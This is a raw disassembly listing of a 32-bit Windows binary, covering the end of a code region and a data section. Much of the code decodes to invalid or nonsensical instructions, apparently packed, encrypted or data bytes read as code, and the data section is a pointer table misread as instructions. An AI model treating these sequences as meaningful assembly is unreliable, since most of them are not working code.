  411b38:	(bad)  
  411b3a:	ror    DWORD PTR [edi-0xb],0x2e
  411b3e:	paddd  mm7,QWORD PTR [esi-0x59]
  411b42:	xchg   edi,eax
  411b43:	pusha  
  411b44:	popf   
  411b45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b46:	pop    ss
  411b47:	nop
  411b48:	mov    ds:0x1d94cd8b,eax
  411b4d:	push   ecx
  411b4e:	mov    edx,0x101b9984
  411b53:	pop    edi
  411b54:	mov    es,edx
  411b56:	out    dx,al
  411b57:	add    BYTE PTR [ecx+0x60],0x31
  411b5b:	xor    BYTE PTR [edi+0x16],bh
  411b5e:	or     eax,0x2d885c56
  411b63:	fsubr  DWORD PTR [edx+0x10800ba]
  411b69:	sahf   
  411b6a:	jmp    0xe62e:0x7aaef334
  411b71:	inc    edx
  411b72:	adc    ecx,DWORD PTR [eax+0x55cd4390]
  411b78:	push   esi
  411b79:	test   BYTE PTR [ecx-0x45],0x7c
  411b7d:	xchg   ebx,eax
  411b7e:	adc    esi,DWORD PTR [eax]
  411b80:	(bad)  
  411b81:	in     eax,dx
  411b82:	cld    
  411b83:	int3   
  411b84:	adc    esp,ecx
  411b86:	mov    dh,0x85
  411b88:	sub    BYTE PTR [edi],ch
  411b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b8b:	outs   dx,DWORD PTR ds:[esi]
  411b8c:	retf   0xf5
  411b8f:	mov    ds:0x55d3e7ca,al
  411b94:	sbb    BYTE PTR [eax],dh
  411b96:	pop    esi
  411b97:	lahf   
  411b98:	pop    ebp
  411b99:	xlat   BYTE PTR ds:[ebx]
  411b9a:	imul   DWORD PTR [ebx]
  411b9c:	repz test al,0xe9
  411b9f:	mul    BYTE PTR [eiz*8-0xc12e28f]
  411ba6:	pop    esi
  411ba7:	adc    al,0x8
  411ba9:	push   ds
  411baa:	(bad)  
  411bab:	push   ecx
  411bac:	push   edi
  411bad:	out    dx,al
  411bae:	sub    BYTE PTR [ecx-0x70],cl
  411bb1:	call   0x4b5e:0x7cb56880
  411bb8:	jne    0x411b6e
  411bba:	(bad)  
  411bbb:	aad    0x7a
  411bbd:	cmp    DWORD PTR [edx+0x5f],esi
  411bc0:	push   ebp
  411bc1:	outs   dx,BYTE PTR ds:[esi]
  411bc2:	loop   0x411b55
  411bc4:	jne    0x411c27
  411bc6:	leave  
  411bc7:	lds    ebp,FWORD PTR [edx+ebp*8]
  411bca:	xor    bh,BYTE PTR [esi+0x50]
  411bcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bce:	xchg   esi,eax
  411bcf:	push   edi
  411bd0:	cmp    DWORD PTR [eax+ebp*2+0x1b3b6df2],edi
  411bd7:	cwde   
  411bd8:	xchg   ebp,esp
  411bda:	push   ds
  411bdb:	mov    ds:0x57e859c1,eax
  411be0:	adc    al,0x3e
  411be2:	xlat   BYTE PTR ds:[ebx]
  411be3:	(bad)  
  411be4:	fstp   DWORD PTR [edx]
  411be6:	repnz cmc 
  411be8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411be9:	sbb    DWORD PTR [ecx-0x5c],0x40a27c58
  411bf0:	cmp    al,BYTE PTR [esi+0x645ec847]
  411bf6:	cmp    edx,DWORD PTR [esi-0x7e881583]
  411bfc:	lea    eax,[ebp+0x607065f1]
  411c02:	push   cs
  411c03:	mov    edi,esi
  411c05:	fcom   QWORD PTR [ebp+0x13]
  411c08:	imul   ebp,DWORD PTR [edi-0x489a7df6],0x510892af
  411c12:	sub    BYTE PTR [edx-0x20],dl
  411c15:	jno    0x411c58
  411c17:	sbb    BYTE PTR [eax+0x3f],0x2e
  411c1b:	ror    DWORD PTR [ecx+0x13f3f550],1
  411c21:	add    ebp,DWORD PTR [ecx+0x1e06b285]
  411c27:	pop    ebp
  411c28:	xchg   ebx,eax
  411c29:	out    0xdc,eax
  411c2b:	jne    0x411bae
  411c2d:	dec    esp
  411c2e:	xchg   edx,eax
  411c2f:	mov    ds,WORD PTR [ebp-0xa]
  411c32:	jmp    0x5e6f1983
  411c37:	icebp  
  411c38:	(bad)
  411c3c:	xor    eax,edx
  411c3e:	push   esi
  411c3f:	mov    esi,DWORD PTR [ebp+0x8]
  411c42:	mov    ecx,0x32729b
  411c47:	add    eax,ecx
  411c49:	jmp    0x411e84
  411c4e:	mov    WORD PTR [eax-0x1a6d186e],cs
  411c54:	imul   esi,DWORD PTR [ecx-0x48],0xdcdad6c4
  411c5b:	jl     0x411c54
  411c5d:	mov    bh,al
  411c5f:	dec    ebx
  411c60:	jle    0x411ce0
  411c62:	adc    BYTE PTR [esi+edi*2+0x7e],bh
  411c66:	sub    cl,ah
  411c68:	mov    ebp,0xa74bf579
  411c6d:	xor    eax,DWORD PTR [edi-0x40]
  411c70:	xor    dh,BYTE PTR [ebx-0x2e]
  411c73:	div    DWORD PTR [edx-0x58]
  411c76:	xchg   esi,eax
  411c77:	adc    eax,0xc8cd9415
  411c7c:	fiadd  WORD PTR [edx+0x20]
  411c7f:	sub    ah,BYTE PTR [ebx-0x6a63889f]
  411c85:	mov    ds:0x8e58e803,eax
  411c8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c8b:	gs addr16 aas 
  411c8e:	jge    0x411c69
  411c90:	dec    ecx
  411c91:	ss and edi,ecx
  411c94:	nop
  411c95:	pushf  
  411c96:	in     al,dx
  411c97:	jae    0x411c5b
  411c99:	mov    esi,tr3
  411c9c:	jo     0x411cca
  411c9e:	or     ecx,DWORD PTR [ecx+0x7d]
  411ca1:	rcl    BYTE PTR [esi],0xfe
  411ca4:	sub    ebx,ebx
  411ca6:	retf   0x563f
  411ca9:	retf   
  411caa:	int3   
  411cab:	sbb    al,0xb2
  411cae:	cmp    eax,0x7b93f58
  411cb3:	mov    DWORD PTR [edx+0x4a],edx
  411cb6:	mov    dl,0x9a
  411cb8:	fcomi  st,st(0)
  411cba:	arpl   WORD PTR [eax-0x43258c65],sp
  411cc0:	sar    BYTE PTR [edi+0x24],1
  411cc3:	pop    ds
  411cc4:	mov    DWORD PTR [ebx],esp
  411cc6:	mov    cl,0x1a
  411cc8:	je     0x411c7a
  411cca:	popf   
  411ccb:	leave  
  411ccc:	adc    DWORD PTR [edi+ebp*2+0x57b69d5a],0x10
  411cd4:	inc    eax
  411cd5:	lods   eax,DWORD PTR ds:[esi]
  411cd6:	sbb    DWORD PTR [edi+0x60d26eac],0xffffff82
  411cdd:	in     eax,0x6
  411cdf:	mov    eax,0x65a5b55f
  411ce4:	jnp    0x411c74
  411ce6:	jge    0x411cdb
  411ce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ce9:	adc    al,0x6e
  411ceb:	add    DWORD PTR [ebx],esi
  411ced:	jecxz  0x411c96
  411cef:	add    DWORD PTR [esi-0x77],edx
  411cf2:	(bad)  
  411cf3:	cli    
  411cf4:	mov    ah,0xf5
  411cf6:	das    
  411cf7:	pop    esp
  411cf8:	xchg   esp,eax
  411cf9:	pop    edi
  411cfa:	test   DWORD PTR [ebx],eax
  411cfc:	scas   al,BYTE PTR es:[edi]
  411cfd:	aaa    
  411cfe:	cmp    BYTE PTR [edi+ebp*1],al
  411d01:	jnp    0x411caf
  411d03:	xchg   eax,ecx
  411d05:	not    DWORD PTR [ecx-0x69e707d2]
  411d0b:	aad    0x40
  411d0d:	test   eax,0x8b1bcd40
  411d12:	xchg   edi,eax
  411d13:	(bad)  
  411d14:	xchg   esp,eax
  411d15:	stc    
  411d16:	adc    ecx,0xf3166d46
  411d1c:	shl    BYTE PTR [esi-0x33],1
  411d1f:	adc    DWORD PTR [ecx+0x48],edx
  411d22:	ss enter 0x60f7,0x21
  411d27:	and    esp,DWORD PTR [esi+0x2f00fb81]
  411d2d:	xchg   edi,eax
  411d2e:	int    0xad
  411d30:	jp     0x411d2c
  411d32:	pmaddwd mm2,mm7
  411d35:	(bad)  
  411d36:	sub    BYTE PTR fs:[eax+0x2a],0x38
  411d3b:	push   ds
  411d3c:	inc    edi
  411d3d:	mov    dl,0xf7
  411d3f:	test   DWORD PTR [ecx],ecx
  411d41:	and    al,0x41
  411d43:	and    bh,BYTE PTR [edx]
  411d45:	xor    BYTE PTR [edx+0x5d7fc8b1],dl
  411d4b:	mov    edi,0xd4a197df
  411d50:	lahf   
  411d51:	sub    DWORD PTR [ecx-0x47351843],0x881981a7
  411d5b:	inc    esp
  411d5c:	mov    ss,WORD PTR [ebx+0x7f]
  411d5f:	inc    esi
  411d60:	mul    BYTE PTR [eax-0x43]
  411d63:	aam    0xc3
  411d65:	call   FWORD PTR [ecx-0x61]
  411d68:	or     dh,BYTE PTR [edi-0x54]
  411d6b:	(bad)  
  411d6c:	xchg   ecx,eax
  411d6d:	loop   0x411d2a
  411d6f:	fmul   st,st(3)
  411d71:	xor    ebp,DWORD PTR [edx]
  411d73:	jge    0x411dbb
  411d75:	pop    edx
  411d76:	leave  
  411d77:	dec    edx
  411d78:	(bad)  
  411d79:	neg    BYTE PTR [eax+0xa3bb37e]
  411d7f:	and    al,0x56
  411d81:	ficomp WORD PTR [ecx]
  411d83:	mov    bl,0x42
  411d85:	mov    dh,0x18
  411d87:	add    al,0x67
  411d89:	gs ret 0x63df
  411d8d:	sbb    eax,DWORD PTR ds:0xdb92e5a9
  411d93:	and    dl,ch
  411d95:	repz data16 mov bh,0xec
  411d99:	cmp    ebx,DWORD PTR [edx]
  411d9b:	or     BYTE PTR [edi+0x4aac1455],ch
  411da1:	cmp    al,bh
  411da3:	test   BYTE PTR [eax-0x3f159999],0x4a
  411daa:	ds jae 0x411d8f
  411dad:	push   edi
  411dae:	in     eax,0xb6
  411db0:	lea    edx,[edi-0x7c]
  411db3:	mov    ds:0x49a8db,eax
  411db8:	and    ebx,DWORD PTR [ebp+0x21]
  411dbb:	sbb    esp,DWORD PTR [edx-0x4a]
  411dbe:	enter  0xbbed,0x65
  411dc2:	or     BYTE PTR [edx],al
  411dc4:	popf   
  411dc5:	(bad)  
  411dc6:	lahf   
  411dc7:	push   0x2a4a05ba
  411dcc:	sbb    DWORD PTR [eax+0x11],ebp
  411dcf:	(bad)  
  411dd0:	in     al,dx
  411dd1:	jbe    0x411e36
  411dd3:	or     DWORD PTR [edx],esp
  411dd5:	fimul  DWORD PTR [ebx-0x6a]
  411dd8:	pextrw edx,(bad),0xc5
  411dda:	adc    al,0xba
  411ddc:	inc    ebx
  411ddd:	jecxz  0x411d60
  411ddf:	scas   al,BYTE PTR es:[edi]
  411de0:	push   esi
  411de1:	jo     0x411d6b
  411de3:	xor    eax,0x425291cd
  411de8:	push   eax
  411de9:	push   edx
  411dea:	jmp    0xb1f512cd
  411def:	dec    edx
  411df0:	rol    DWORD PTR [edi],cl
  411df2:	dec    edi
  411df3:	sub    al,0xb3
  411df5:	dec    edx
  411df6:	cmp    BYTE PTR [ecx-0x48],0xd4
  411dfa:	jmp    0x411dbb
  411dfc:	add    ebp,DWORD PTR [ebx-0x708a73a6]
  411e02:	popa   
  411e03:	iret   
  411e04:	bound  edi,QWORD PTR [edx+0x326d7632]
  411e0a:	inc    edi
  411e0b:	pop    edx
  411e0c:	into   
  411e0d:	std    
  411e0e:	aad    0xc5
  411e10:	(bad)  
  411e11:	and    esp,DWORD PTR [edx+0x3f23eb6]
  411e17:	outs   dx,BYTE PTR ds:[esi]
  411e18:	cmp    BYTE PTR [edi],cl
  411e1a:	aaa    
  411e1b:	jbe    0x411e96
  411e1d:	cmp    BYTE PTR [ecx],dh
  411e1f:	imul   edi,DWORD PTR [ebx],0xd2b94ce3
  411e25:	sub    al,0x82
  411e27:	mov    ch,0xb4
  411e29:	in     eax,dx
  411e2a:	addr16 push eax
  411e2c:	mov    bl,0x8f
  411e2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e2f:	js     0x411df6
  411e31:	loop   0x411dec
  411e33:	push   es
  411e34:	test   DWORD PTR ss:[ebp+0x1c8de493],ebx
  411e3b:	pop    edi
  411e3c:	push   0xefcb6893
  411e41:	sub    bl,ah
  411e43:	adc    BYTE PTR [ecx-0x34],dl
  411e46:	mov    DWORD PTR [edx-0x4687e3eb],edi
  411e4c:	add    DWORD PTR [ebx],0xc41ae874
  411e52:	inc    esi
  411e53:	mov    cl,0xe9
  411e55:	cmp    bh,BYTE PTR [edx]
  411e57:	mov    edi,edi
  411e59:	aad    0x63
  411e5b:	adc    DWORD PTR [esi],ecx
  411e5d:	jg     0x411ebf
  411e5f:	sar    bh,0x9d
  411e62:	jge    0x411e5e
  411e64:	lahf   
  411e65:	shr    BYTE PTR [edx+eiz*2],0xb3
  411e69:	ret    
  411e6a:	push   esp
  411e6b:	adc    al,0x36
  411e6d:	jmp    0x18c13634
  411e72:	inc    ebx
  411e73:	jp     0x411e06
  411e75:	mov    cl,0x31
  411e77:	pop    ss
  411e78:	loop   0x411e91
  411e7a:	in     eax,dx
  411e7b:	mov    al,0x49
  411e7d:	pop    ss
  411e7e:	fnstenv [ebx+0x46]
  411e81:	repnz aas 
  411e83:	adc    DWORD PTR [ecx],edi
  411e85:	inc    esi
  411e86:	push   esp
  411e87:	pop    esi
  411e88:	je     0x411e96
  411e8e:	mov    eax,DWORD PTR [ebp+0x8]
  411e91:	jmp    0x411eaf
  411e96:	mov    eax,DWORD PTR [ebp-0x4]
  411e99:	xor    eax,edx
  411e9b:	add    eax,ecx
  411e9d:	jmp    0x411eaf
  411ea2:	mov    eax,DWORD PTR [ebp-0x4]
  411ea5:	xor    eax,0x7510854
  411eaa:	add    eax,0x32729b
  411eaf:	leave  
  411eb0:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    BYTE PTR [ecx],0x1
  412003:	add    BYTE PTR [edx-0x5dfffed7],dl
  412009:	sub    DWORD PTR [ecx],eax
  41200b:	add    BYTE PTR [eax-0x41fffed7],dh
  412011:	sub    DWORD PTR [ecx],eax
  412013:	add    ah,dl
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    ah,ah
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    dh,dh
  41201d:	sub    DWORD PTR [ecx],eax
  41201f:	add    BYTE PTR [edx],al
  412021:	sub    al,BYTE PTR [ecx]
  412023:	add    BYTE PTR [edx+ebp*1],dl
  412026:	add    DWORD PTR [eax],eax
  412028:	and    BYTE PTR [edx],ch
  41202a:	add    DWORD PTR [eax],eax
  41202c:	sub    al,BYTE PTR cs:[ecx]
  41202f:	add    BYTE PTR [esi+0x2a],al
  412032:	add    DWORD PTR [eax],eax
  412034:	pop    eax
  412035:	sub    al,BYTE PTR [ecx]
  412037:	add    BYTE PTR [esi+0x2a],ah
  41203a:	add    DWORD PTR [eax],eax
  41203c:	js     0x412068
  41203e:	add    DWORD PTR [eax],eax
  412040:	mov    gs,WORD PTR [edx]
  412042:	add    DWORD PTR [eax],eax
  412044:	sahf   
  412045:	sub    al,BYTE PTR [ecx]
  412047:	add    BYTE PTR [edx-0x35fffed6],dh
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    dh,bl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    dl,ch
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    ah,bh
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx],dl
  41205d:	sub    eax,DWORD PTR [ecx]
  41205f:	add    BYTE PTR [esi],bl
  412061:	sub    eax,DWORD PTR [ecx]
  412063:	add    BYTE PTR [ebx+ebp*1],ch
  412066:	add    DWORD PTR [eax],eax
  412068:	inc    eax
  412069:	sub    eax,DWORD PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2b],cl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    eax,DWORD PTR fs:[ecx]
  412073:	add    BYTE PTR [edx+0x2b],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	test   BYTE PTR [ebx],ch
  41207a:	add    DWORD PTR [eax],eax
  41207c:	mov    gs,WORD PTR [ebx]
  41207e:	add    DWORD PTR [eax],eax
  412080:	sahf   
  412081:	sub    eax,DWORD PTR [ecx]
  412083:	add    BYTE PTR [eax-0x3bfffed5],bh
  412089:	sub    eax,DWORD PTR [ecx]
  41208b:	add    al,dl
  41208d:	sub    eax,DWORD PTR [ecx]
  41208f:	add    ah,ch
  412091:	sub    eax,DWORD PTR [ecx]
  412093:	add    ah,bh
  412095:	sub    eax,DWORD PTR [ecx]
  412097:	add    BYTE PTR [edx],cl
  412099:	sub    al,0x1
  41209b:	add    BYTE PTR [eax],bl
  41209d:	sub    al,0x1
  41209f:	add    BYTE PTR [esp+ebp*1],ah
  4120a2:	add    DWORD PTR [eax],eax
  4120a4:	cmp    BYTE PTR [ecx+eax*1],ch
  4120a7:	add    BYTE PTR [esi+0x2c],cl
  4120aa:	add    DWORD PTR [eax],eax
  4120ac:	pop    edx
  4120ad:	sub    al,0x1
  4120af:	add    BYTE PTR [edx+0x2c],ch
  4120b2:	add    DWORD PTR [eax],eax
  4120b4:	jl     0x4120e2
  4120b6:	add    DWORD PTR [eax],eax
  4120b8:	mov    gs,WORD PTR [ecx+eax*1]
  4120bb:	add    BYTE PTR [eax-0x47fffed4],ah
  4120c1:	sub    al,0x1
  4120c3:	add    al,cl
  4120c5:	sub    al,0x1
  4120c7:	add    dh,dl
  4120c9:	sub    al,0x1
  4120cb:	add    ah,ah
  4120cd:	sub    al,0x1
  4120cf:	add    dh,dh
  4120d1:	sub    al,0x1
  4120d3:	add    BYTE PTR [esi],al
  4120d5:	sub    eax,0x2d140001
  4120da:	add    DWORD PTR [eax],eax
  4120dc:	es sub eax,0x2d3c0001
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	dec    edx
  4120e5:	sub    eax,0x2d5a0001
  4120ea:	add    DWORD PTR [eax],eax
  4120ec:	push   0x2d
  4120ee:	add    DWORD PTR [eax],eax
  4120f0:	je     0x41211f
  4120f2:	add    DWORD PTR [eax],eax
  4120f4:	test   BYTE PTR ds:0x2d900001,ch
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	sahf   
  4120fd:	sub    eax,0x2daa0001
  412102:	add    DWORD PTR [eax],eax
  412104:	mov    eax,0xd000012d
  412109:	sub    eax,0x2dde0001
  41210e:	add    DWORD PTR [eax],eax
  412110:	out    dx,al
  412111:	sub    eax,0x2dfe0001
  412116:	add    DWORD PTR [eax],eax
  412118:	or     al,0x2e
  41211a:	add    DWORD PTR [eax],eax
  41211c:	push   ds
  41211d:	add    DWORD PTR cs:[eax],eax
  412120:	xor    ch,BYTE PTR [esi]
  412122:	add    DWORD PTR [eax],eax
  412124:	dec    esi
  412125:	add    DWORD PTR cs:[eax],eax
  412128:	pop    esi
  412129:	add    DWORD PTR cs:[eax],eax
  41212c:	je     0x41215c
  41212e:	add    DWORD PTR [eax],eax
  412130:	xchg   BYTE PTR [esi],ch
  412132:	add    DWORD PTR [eax],eax
  412134:	call   0x12e:0xac00012e
  41213b:	add    BYTE PTR [esi-0x33fffed2],bh
  412141:	add    DWORD PTR cs:[eax],eax
  412144:	fisubr DWORD PTR [esi]
  412146:	add    DWORD PTR [eax],eax
  412148:	out    dx,al
  412149:	add    DWORD PTR cs:[eax],eax
  41214c:	cli    
  41214d:	add    DWORD PTR cs:[eax],eax
  412150:	push   cs
  412151:	das    
  412152:	add    DWORD PTR [eax],eax
  412154:	push   ds
  412155:	das    
  412156:	add    DWORD PTR [eax],eax
  412158:	cs das 
  41215a:	add    DWORD PTR [eax],eax
  41215c:	inc    eax
  41215d:	das    
  41215e:	add    DWORD PTR [eax],eax
  412160:	pop    eax
  412161:	das    
  412162:	add    DWORD PTR [eax],eax
  412164:	outs   dx,BYTE PTR ds:[esi]
  412165:	das    
  412166:	add    DWORD PTR [eax],eax
  412168:	jle    0x412199
  41216a:	add    DWORD PTR [eax],eax
  41216c:	call   0x12f:0xae00012f
  412173:	add    BYTE PTR [edx-0x39fffed1],bh
  412179:	das    
  41217a:	add    DWORD PTR [eax],eax
  41217c:	aam    0x2f
  41217e:	add    DWORD PTR [eax],eax
  412180:	in     al,0x2f
  412182:	add    DWORD PTR [eax],eax
  412184:	cli    
  412185:	das    
  412186:	add    DWORD PTR [eax],eax
  412188:	or     al,0x30
  41218a:	add    DWORD PTR [eax],eax
  41218c:	push   ss
  41218d:	xor    BYTE PTR [ecx],al
  41218f:	add    BYTE PTR [esi],ch
  412191:	xor    BYTE PTR [ecx],al
  412193:	add    BYTE PTR [edx],bh
  412195:	xor    BYTE PTR [ecx],al
  412197:	add    BYTE PTR [eax+esi*1+0x1],cl
  41219b:	add    BYTE PTR [eax+0x30],bl
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	jb     0x4121d2
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	jle    0x4121d6
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	mov    WORD PTR [eax],?
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	mov    ds:0xb8000130,al
  4121b1:	xor    BYTE PTR [ecx],al
  4121b3:	add    BYTE PTR [eax],al
  4121b5:	add    BYTE PTR [eax],al
  4121b7:	add    ah,dl
  4121b9:	xor    BYTE PTR [ecx],al
  4121bb:	add    al,ch
  4121bd:	xor    BYTE PTR [ecx],al
  4121bf:	add    BYTE PTR [eax],al
  4121c1:	xor    DWORD PTR [ecx],eax
  4121c3:	add    BYTE PTR [esi],dl
  4121c5:	xor    DWORD PTR [ecx],eax
  4121c7:	add    BYTE PTR [esi],ah
  4121c9:	xor    DWORD PTR [ecx],eax
  4121cb:	add    BYTE PTR [ecx+esi*1],dh
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	dec    esp
  4121d1:	xor    DWORD PTR [ecx],eax
  4121d3:	add    BYTE PTR [edx+0x31],bl
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	xor    WORD PTR [ecx],ax
  4121db:	add    BYTE PTR [eax+0x31],bh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xchg   esp,eax
  4121e1:	xor    DWORD PTR [ecx],eax
  4121e3:	add    BYTE PTR [edx-0x49fffecf],ah
  4121e9:	xor    DWORD PTR [ecx],eax
  4121eb:	add    dh,al
  4121ed:	xor    DWORD PTR [ecx],eax
  4121ef:	add    dl,dl
  4121f1:	xor    DWORD PTR [ecx],eax
  4121f3:	add    ah,ah
  4121f5:	xor    DWORD PTR [ecx],eax
  4121f7:	add    ah,ch
  4121f9:	xor    DWORD PTR [ecx],eax
  4121fb:	add    ah,bh
  4121fd:	xor    DWORD PTR [ecx],eax
  4121ff:	add    BYTE PTR [esi],cl
  412201:	xor    al,BYTE PTR [ecx]
  412203:	add    BYTE PTR [edx+esi*1],bl
  412206:	add    DWORD PTR [eax],eax
  412208:	xor    al,BYTE PTR cs:[ecx]
  41220b:	add    BYTE PTR [eax+0x32],al
  41220e:	add    DWORD PTR [eax],eax
  412210:	push   esi
  412211:	xor    al,BYTE PTR [ecx]
  412213:	add    BYTE PTR [esi+0x32],ah
  412216:	add    DWORD PTR [eax],eax
  412218:	js     0x41224c
  41221a:	add    DWORD PTR [eax],eax
  41221c:	mov    dh,BYTE PTR [edx]
  41221e:	add    DWORD PTR [eax],eax
  412220:	call   0x132:0xb0000132
  412227:	add    al,al
  412229:	xor    al,BYTE PTR [ecx]
  41222b:	add    ah,cl
  41222d:	xor    al,BYTE PTR [ecx]
  41222f:	add    dl,ah
  412231:	xor    al,BYTE PTR [ecx]
  412233:	add    ah,dh
  412235:	xor    al,BYTE PTR [ecx]
  412237:	add    BYTE PTR [esi],al
  412239:	xor    eax,DWORD PTR [ecx]
  41223b:	add    BYTE PTR [esi],dl
  41223d:	xor    eax,DWORD PTR [ecx]
  41223f:	add    BYTE PTR [ebx+esi*1],ch
  412242:	add    DWORD PTR [eax],eax
  412244:	cmp    dh,BYTE PTR [ebx]
  412246:	add    DWORD PTR [eax],eax
  412248:	push   eax
  412249:	xor    eax,DWORD PTR [ecx]
  41224b:	add    BYTE PTR [ebx+esi*1+0x1],ah
  41224f:	add    BYTE PTR [edx+0x33],bh
  412252:	add    DWORD PTR [eax],eax
  412254:	cwde   
  412255:	xor    eax,DWORD PTR [ecx]
  412257:	add    BYTE PTR [eax-0x43fffecd],dh
  41225d:	xor    eax,DWORD PTR [ecx]
  41225f:	add    dh,cl
  412261:	xor    eax,DWORD PTR [ecx]
  412263:	add    dl,bl
  412265:	xor    eax,DWORD PTR [ecx]
  412267:	add    dh,ch
  412269:	xor    eax,DWORD PTR [ecx]
  41226b:	add    BYTE PTR [esi],al
  41226d:	xor    al,0x1
  41226f:	add    BYTE PTR [edx],dl
  412271:	xor    al,0x1
  412273:	add    BYTE PTR [eax],ah
  412275:	xor    al,0x1
  412277:	add    BYTE PTR [edx],dh
  412279:	xor    al,0x1
  41227b:	add    BYTE PTR [edx+0x34],al
  41227e:	add    DWORD PTR [eax],eax
  412280:	dec    esp
  412281:	xor    al,0x1
  412283:	add    BYTE PTR [eax],al
  412285:	add    BYTE PTR [eax],al
  412287:	add    BYTE PTR [esi+0x34],ah
  41228a:	add    DWORD PTR [eax],eax
  41228c:	je     0x4122c2
  41228e:	add    DWORD PTR [eax],eax
  412290:	xor    BYTE PTR [ecx+eax*1],0x0
  412294:	xchg   esp,eax
  412295:	xor    al,0x1
  412297:	add    BYTE PTR [eax],al
  412299:	add    BYTE PTR [eax],al
  41229b:	add    BYTE PTR [esi-0x43fffecc],ch
  4122a1:	xor    al,0x1
  4122a3:	add    dh,cl
  4122a5:	xor    al,0x1
  4122a7:	add    ah,bl
  4122a9:	xor    al,0x1
  4122ab:	add    ah,ah
  4122ad:	xor    al,0x1
  4122af:	add    ah,dh
  4122b1:	xor    al,0x1
  4122b3:	add    BYTE PTR [eax],al
  4122b5:	xor    eax,0x350e0001
  4122ba:	add    DWORD PTR [eax],eax
  4122bc:	push   ss
  4122bd:	xor    eax,0x35220001
  4122c2:	add    DWORD PTR [eax],eax
  4122c4:	sub    al,0x35
  4122c6:	add    DWORD PTR [eax],eax
  4122c8:	ss xor eax,0x353e0001
  4122ce:	add    DWORD PTR [eax],eax
  4122d0:	dec    eax
  4122d1:	xor    eax,0x35520001
  4122d6:	add    DWORD PTR [eax],eax
  4122d8:	pop    esp
  4122d9:	xor    eax,0x35680001
  4122de:	add    DWORD PTR [eax],eax
  4122e0:	je     0x412317
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	jle    0x41231b
  4122e6:	add    DWORD PTR [eax],eax
  4122e8:	mov    BYTE PTR ds:0x35920001,dh
  4122ee:	add    DWORD PTR [eax],eax
  4122f0:	mov    al,ds:0xa8000135
  4122f5:	xor    eax,0x35b40001
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	mov    esi,0xc8000135
  412301:	xor    eax,0x35d20001
  412306:	add    DWORD PTR [eax],eax
  412308:	fidiv  WORD PTR ds:0x35ec0001
  41230e:	add    DWORD PTR [eax],eax
  412310:	clc    
  412311:	xor    eax,0x36000001
  412316:	add    DWORD PTR [eax],eax
  412318:	or     al,0x36
  41231a:	add    DWORD PTR [eax],eax
  41231c:	push   ss
  41231d:	add    DWORD PTR ss:[eax],eax
  412320:	and    BYTE PTR [esi],dh
  412322:	add    DWORD PTR [eax],eax
  412324:	sub    BYTE PTR [esi],dh
  412326:	add    DWORD PTR [eax],eax
  412328:	xor    dh,BYTE PTR [esi]
  41232a:	add    DWORD PTR [eax],eax
  41232c:	cmp    al,0x36
  41232e:	add    DWORD PTR [eax],eax
  412330:	inc    esi
  412331:	add    DWORD PTR ss:[eax],eax
  412334:	push   eax
  412335:	add    DWORD PTR ss:[eax],eax
  412338:	pop    edx
  412339:	add    DWORD PTR ss:[eax],eax
  41233c:	fs add DWORD PTR ss:[eax],eax
  412340:	outs   dx,BYTE PTR ds:[esi]
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	xor    BYTE PTR [esi],0x1
  412347:	add    BYTE PTR [edx+0x136],dl
  41234d:	add    BYTE PTR [eax],al
  41234f:	add    BYTE PTR [eax-0x3ffffeca],ch
  412355:	add    DWORD PTR ss:[eax],eax
  412358:	fdiv   DWORD PTR [esi]
  41235a:	add    DWORD PTR [eax],eax
  41235c:	hlt    
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	or     al,0x37
  412362:	add    DWORD PTR [eax],eax
  412364:	and    al,0x37
  412366:	add    DWORD PTR [eax],eax
  412368:	add    BYTE PTR [eax],al
  41236a:	add    BYTE PTR [eax],al
  41236c:	inc    esi
  41236d:	aaa    
  41236e:	add    DWORD PTR [eax],eax
  412370:	pop    esp
  412371:	aaa    
  412372:	add    DWORD PTR [eax],eax
  412374:	jo     0x4123ad
  412376:	add    DWORD PTR [eax],eax
  412378:	jle    0x4123b1
  41237a:	add    DWORD PTR [eax],eax
  41237c:	mov    dh,BYTE PTR [edi]
  41237e:	add    DWORD PTR [eax],eax
  412380:	cwde   
  412381:	aaa    
  412382:	add    DWORD PTR [eax],eax
  412384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412385:	aaa    
  412386:	add    DWORD PTR [eax],eax
  412388:	mov    ah,0x37
  41238a:	add    DWORD PTR [eax],eax
  41238c:	les    esi,FWORD PTR [edi]
  41238e:	add    DWORD PTR [eax],eax
  412390:	into   
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	fidiv  DWORD PTR [edi]
  412396:	add    DWORD PTR [eax],eax
  412398:	repnz aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	push   es
  41239d:	cmp    BYTE PTR [ecx],al
  41239f:	add    BYTE PTR [eax],bl
  4123a1:	cmp    BYTE PTR [ecx],al
  4123a3:	add    BYTE PTR [eax],ch
  4123a5:	cmp    BYTE PTR [ecx],al
